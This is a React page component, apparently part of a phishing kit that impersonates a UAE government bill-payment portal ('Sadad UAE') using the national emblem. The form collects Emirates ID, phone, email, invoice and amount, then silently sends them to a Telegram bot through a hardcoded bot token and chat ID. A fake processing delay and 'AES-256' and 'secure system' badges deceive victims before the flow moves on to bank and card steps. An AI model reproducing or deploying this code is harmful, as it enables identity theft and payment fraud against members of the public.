import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ShieldCheck, Info, Loader2 } from "lucide-react";

export default function UserData() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    invoiceNumber: "",
    idNumber: "",
    phoneNumber: "",
    email: "",
    serviceType: "",
    amount: ""
  });

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const message = `
📝 *بيانات المستخدم - بوابة سداد الإمارات*
--------------------------
🧾 *رقم الفاتورة:* ${formData.invoiceNumber}
🆔 *رقم الهوية:* ${formData.idNumber}
📱 *رقم الجوال:* ${formData.phoneNumber}
📧 *البريد الإلكتروني:* ${formData.email}
🛠 *نوع الخدمة:* ${formData.serviceType}
💰 *المبلغ:* ${formData.amount} درهم إماراتي
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      // Simulate official processing delay
      setTimeout(() => {
        sessionStorage.setItem("paymentData", JSON.stringify(formData));
        setLocation("/select-bank");
      }, 1500);
    } catch (error) {
      console.error(error);
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-amber-500 p-2 rounded-lg">
              <span className="text-white font-bold text-sm">سداد</span>
            </div>
            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
          </div>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
        </div>
      </header>

      <main className="flex-grow container py-12 px-4">
        <div className="max-w-2xl mx-auto">
          {/* Progress Steps */}
          <div className="flex justify-between mb-12 relative px-4">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className="flex flex-col items-center z-10">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step === 1 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
                  {step}
                </div>
                <span className={`text-[10px] mt-2 font-bold ${step === 1 ? 'text-amber-600' : 'text-gray-400'}`}>
                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
                </span>
              </div>
            ))}
            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="bg-slate-900 p-6 text-white">
              <h2 className="text-xl font-bold">إدخال بيانات الخدمة</h2>
              <p className="text-slate-400 text-xs mt-1">يرجى التأكد من صحة البيانات المدخلة لضمان معالجة الطلب فوراً</p>
            </div>

            <form onSubmit={handleNext} className="p-8 space-y-6">
              <div className="grid md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <Label htmlFor="invoiceNumber" className="text-sm font-bold text-gray-700">رقم الفاتورة / المرجع</Label>
                  <Input id="invoiceNumber" required placeholder="مثال: 123456789" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.invoiceNumber} onChange={(e) => setFormData({...formData, invoiceNumber: e.target.value})} />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="idNumber" className="text-sm font-bold text-gray-700">رقم الهوية الإماراتية</Label>
                  <Input id="idNumber" required placeholder="784-XXXX-XXXXXXX-X" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.idNumber} onChange={(e) => setFormData({...formData, idNumber: e.target.value})} />
                </div>
              </div>

              <div className="grid md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <Label htmlFor="phoneNumber" className="text-sm font-bold text-gray-700">رقم الهاتف المتحرك</Label>
                  <Input id="phoneNumber" required type="tel" placeholder="05XXXXXXXX" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.phoneNumber} onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})} />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-sm font-bold text-gray-700">البريد الإلكتروني</Label>
                  <Input id="email" required type="email" placeholder="example@domain.ae" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="serviceType" className="text-sm font-bold text-gray-700">نوع الخدمة المطلوبة</Label>
                <Select onValueChange={(val) => setFormData({...formData, serviceType: val})} required>
                  <SelectTrigger id="serviceType" className="bg-gray-50 border-gray-200">
                    <SelectValue placeholder="اختر نوع الخدمة من القائمة" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="دفع الفواتير الحكومية">دفع الفواتير الحكومية الموحدة</SelectItem>
                    <SelectItem value="دفع رسوم المرور والمخالفات">دفع رسوم المرور والمخالفات</SelectItem>
                    <SelectItem value="تجديد التراخيص التجارية">تجديد التراخيص التجارية</SelectItem>
                    <SelectItem value="فواتير الهيئة الاتحادية للكهرباء والماء">فواتير الهيئة الاتحادية للكهرباء والماء</SelectItem>
                    <SelectItem value="رسوم الخدمات البلدية">رسوم الخدمات البلدية</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <Label htmlFor="amount" className="text-sm font-bold text-gray-700">مبلغ السداد الإجمالي (درهم إماراتي)</Label>
                <div className="relative">
                  <Input id="amount" required type="number" placeholder="0.00" className="bg-gray-50 border-gray-200 pr-12 font-bold text-lg text-amber-600" value={formData.amount} onChange={(e) => setFormData({...formData, amount: e.target.value})} />
                  <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-gray-400 font-bold text-xs">د.إ</div>
                </div>
              </div>

              <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl flex gap-3">
                <Info className="w-5 h-5 text-amber-600 shrink-0" />
                <p className="text-[11px] text-amber-800 leading-relaxed">
                  سيتم التحقق من البيانات المدخلة مع قاعدة بيانات الجهة المعنية فور النقر على "متابعة". يرجى التأكد من أن رقم الهاتف مرتبط برقم الهوية لاستلام رمز التحقق.
                </p>
              </div>

              <div className="flex gap-4 pt-4">
                <Button type="button" variant="ghost" className="flex-1 text-gray-500" onClick={() => setLocation("/")}>إلغاء</Button>
                <Button type="submit" className="flex-[2] bg-amber-500 hover:bg-amber-600 text-white font-bold py-6 rounded-xl shadow-lg shadow-amber-500/20" disabled={loading}>
                  {loading ? (
                    <span className="flex items-center gap-2">
                      <Loader2 className="w-5 h-5 animate-spin" /> جاري التحقق من البيانات...
                    </span>
                  ) : "متابعة إلى اختيار البنك"}
                </Button>
              </div>
            </form>
            
            <div className="bg-gray-50 p-4 border-t border-gray-100 flex justify-center items-center gap-6 opacity-50">
              <div className="flex items-center gap-1 text-[10px] font-bold"><ShieldCheck className="w-3 h-3" /> نظام آمن</div>
              <div className="flex items-center gap-1 text-[10px] font-bold"><Lock className="w-3 h-3" /> تشفير AES-256</div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
